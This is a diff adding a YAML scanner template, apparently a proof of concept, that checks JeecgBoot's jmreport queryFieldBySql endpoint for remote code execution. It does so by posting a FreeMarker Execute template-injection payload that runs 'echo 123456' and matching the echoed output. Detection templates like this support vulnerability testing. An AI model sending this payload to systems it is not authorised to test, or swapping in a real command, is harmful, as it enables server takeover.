@@ -1,0 +1,19 @@
+name: jeecgboot-queryFieldBySql-sqli-rce
+set:
+  s1: randomInt(1000,9999)
+groups:
+  poc:  
+    - method: POST
+      path: /jeecg-boot/jmreport/queryFieldBySql
+      follow_redirects: false
+      search:  
+      headers:
+        Content-Type: application/json;charset=UTF-8
+      body: |
+        {"sql":"select 'result:<#assign ex=\"freemarker.template.utility.Execute\"?new()> ${ ex(\"echo 123456 \") }' "}
+      expression: >-
+        response.body.bcontains(b"解析成功") &&  response.body.bcontains(b"123456") 
+detail: 
+  links: 
+  authors:
+  
